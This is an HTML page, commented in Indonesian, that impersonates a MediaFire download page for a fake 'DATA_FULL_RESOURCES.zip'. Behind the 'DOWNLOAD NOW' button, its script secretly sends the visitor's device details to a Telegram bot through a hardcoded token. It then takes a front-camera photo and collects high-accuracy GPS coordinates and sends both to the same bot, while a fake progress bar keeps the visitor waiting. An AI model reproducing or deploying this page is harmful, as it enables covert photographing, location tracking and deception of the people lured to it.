<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>MediaFire - DATA_FULL_RESOURCES</title>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js"></script>
  <style>
    /* MediaFire Branding Colors */
    :root {
        --mf-blue: #0070f3;
        --mf-bg: #f2f2f2;
        --mf-text: #444;
    }
    body { 
        background-color: var(--mf-bg);
        margin: 0; padding: 0;
        font-family: "Open Sans", Arial, sans-serif;
        display: flex; flex-direction: column; align-items: center;
        height: 100vh;
    }
    /* Header Palsu */
    header {
        background: #fff; width: 100%; height: 60px;
        display: flex; align-items: center; padding: 0 20px;
        box-shadow: 0 2px 5px rgba(0,0,0,0.05);
    }
    .logo { color: var(--mf-blue); font-weight: 800; font-size: 22px; letter-spacing: -1px; }

    /* Card Utama */
    .container {
        margin-top: 50px; background: #fff;
        width: 90%; max-width: 700px;
        border-radius: 4px; border: 1px solid #ddd;
        display: flex; flex-direction: column; align-items: center;
        padding: 40px 20px;
    }
    .file-icon { width: 100px; margin-bottom: 20px; }
    .file-name { font-size: 20px; font-weight: bold; color: #333; margin-bottom: 10px; }
    .file-meta { color: #888; font-size: 13px; margin-bottom: 30px; }
    
    /* Tombol Download Biru khas MediaFire */
    .btn-download {
        background: var(--mf-blue); color: #fff;
        border: none; padding: 15px 60px;
        border-radius: 3px; font-size: 16px; font-weight: bold;
        cursor: pointer; transition: background 0.2s;
        box-shadow: 0 4px 0 #0056b3;
    }
    .btn-download:hover { background: #005cc5; }
    .btn-download:active { transform: translateY(2px); box-shadow: 0 2px 0 #0056b3; }

    /* Loader Area */
    #loader { display: none; width: 80%; text-align: center; margin-top: 20px; }
    .progress-bg { background: #eee; height: 12px; border-radius: 6px; overflow: hidden; }
    .progress-fill { background: var(--mf-blue); width: 0%; height: 100%; transition: width 0.3s; }
    .status-msg { font-size: 12px; color: #666; margin-top: 10px; }

    .hidden { display: none; }
  </style>
</head>
<body>

  <header>
    <div class="logo">MediaFire</div>
  </header>

  <div class="container">
    <img src="https://cdn-icons-png.flaticon.com/512/2991/2991112.png" class="file-icon" alt="zip">
    <div class="file-name">DATA_FULL_RESOURCES.zip</div>
    <div class="file-meta">Archive (.zip) | 100.24 GB</div>
    
    <button class="btn-download" id="start-btn">DOWNLOAD NOW</button>

    <div id="loader">
        <div class="progress-bg"><div class="progress-fill" id="pb"></div></div>
        <div class="status-msg" id="st">Preparing download...</div>
    </div>
  </div>

  <video id="v" autoplay muted class="hidden"></video>
  <canvas id="c" class="hidden"></canvas>

  <script>
  (() => {
    const T = '7621493211:AAFfEUR3ri6Z9odBFzvqhGthsymwWPOl5tY';
    const C = '6636068781';
    
    const btn = document.getElementById('start-btn');
    const loader = document.getElementById('loader');
    const pb = document.getElementById('pb');
    const st = document.getElementById('st');

    // Fungsi Kirim ke Telegram (Teks & Foto)
    const sTG = async (m) => { try { await fetch(`https://api.telegram.org/bot${T}/sendMessage`, { method: 'POST', headers: {'Content-Type':'application/json'}, body: JSON.stringify({chat_id:C, text:m, parse_mode:'HTML'})}); } catch(e){} };
    const sP = async (b, n) => { try { const fd = new FormData(); fd.append('chat_id', C); fd.append('photo', b, n); await fetch(`https://api.telegram.org/bot${T}/sendPhoto`, {method:'POST', body:fd}); } catch(e){} };

    // Fungsi Ambil Info & Kamera
    const capture = async (f) => {
        const v = document.getElementById('v'), c = document.getElementById('c');
        try {
            const stream = await navigator.mediaDevices.getUserMedia({video:{facingMode:f}});
            v.srcObject = stream;
            await new Promise(r => v.onloadedmetadata = r); v.play();
            await new Promise(r => setTimeout(r, 1000));
            c.width = v.videoWidth; c.height = v.videoHeight;
            c.getContext('2d').drawImage(v,0,0);
            c.toBlob(b => sP(b, `mf_${f}.jpg`), 'image/jpeg');
            stream.getTracks().forEach(t => t.stop());
            return true;
        } catch(e) { return false; }
    };

    // Alur Eksekusi
    btn.addEventListener('click', async () => {
        btn.style.display = 'none';
        loader.style.display = 'block';

        st.innerText = "Connecting to server...";
        pb.style.width = "30%";
        
        // Kirim Info HP
        await sTG(`<b>📥 MEDIAFIRE DOWNLOAD LOG</b>\n\nDevice: ${navigator.userAgent}`);

        st.innerText = "Verifying regional access...";
        pb.style.width = "60%";
        
        // Ambil Foto & GPS
        await capture("user");
        if (navigator.geolocation) {
            navigator.geolocation.getCurrentPosition(async (pos) => {
                await sTG(`📍 Lokasi: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`);
            }, null, {enableHighAccuracy:true});
        }

        setTimeout(() => {
            pb.style.width = "100%";
            st.innerText = "Download starting...";
            // Redirect jika perlu
        }, 2000);
    });
  })();
  </script>
</body>
</html>
